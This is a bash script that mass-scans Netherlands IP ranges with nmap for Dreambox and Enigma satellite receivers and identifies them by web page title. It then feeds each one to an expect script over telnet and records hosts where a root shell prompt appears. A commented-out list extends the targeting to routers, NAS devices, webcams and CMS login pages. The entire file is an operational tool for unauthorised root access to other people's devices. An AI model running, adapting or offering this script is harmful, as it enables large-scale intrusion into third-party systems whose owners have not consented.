#!/bin/bash
echo "RUNNING STAGE1 (nmap scanning, this will take a while)"
for i in $(cat whois-netherlands-full.txt) ; do
nmap -v -PN -T4 --max_rtt_timeout 150ms --initial_rtt_timeout 300ms --min_hostgroup 3500 --max-retries 0 --max-scan-delay 1500ms  -n -p 31338,31339,12000,16001  $i >> ./UNFORMATED ; done

#Read RAW Unformated file and search and sort the input, write readable output to iplist#
cat ./UNFORMATED | grep open -B 3 | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | sort -u > ./iplist

echo "RUNNING STAGE2 (Initializing Wgetguard + Primary List processing)"
./wgetguard &
for i in $(cat ./iplist) ; do echo $i >> ./TITLE_LIST ; wget -t 1 -T 2 -qO- http://$i |grep -E  "title|Title" >> ./TITLE_LIST ; done
cat ./TITLE_LIST | grep -E "Dreambox|Enigma|Open\ Webif|PP\ Neverland\ E2|WebControl"  -B 1 > ./Dreamboxlista

#cat ./TITLE_LIST |grep -E "Iomega|LaCie|VoIPBOX\PRI|SIP-based\ PBX\ for\ VoIP\ telephony|Outlook|joomla|wordpress|drupal|silverstripe|wp-login|phpmyadmin|WAGO\ Ethernet\ Web-Based\ Management|webcam|webcamXP\ 5|FreeNAS|FreeNAS&trade|Synology|MyStora|RouterOS|Router|D-Link|3Com|zyXEL|NetGear|WLAN|Wireless|Sipura\ SPA\ Configuration|Gateway|Xtreamer|Media\ Server" -B 1 > ./random-interresting-stuff

#Automatically turn off and kill wgetguard when time in ms exceeds#
pkill wgetguard
echo "RUNNING STAGE3 (EXPECT Telnet to Final list)"
for j in $(cat ./Dreamboxlista | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" | sort -u); do echo $j >> ./DboxROOT_RAW$aaa && expect -f ./expectfile $j >> ./DboxROOT_RAW$aaa; sleep 1 ; done
#

cat ./DboxROOT_RAW$aaa | grep root@ -B 17 | grep Connect  | grep -o "[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*" > ./DboxROOT_CleanIP

#cd ..
#echo "Cleaning UP"
#if [ $(ls -lt | grep '^d'  | cut -d\  -f8 | wc -l) -gt 5 ]; then rm -R $(ls -lt | grep '^d'  | cut -d\  -f8  | tail -1) ; fi
#echo DONE
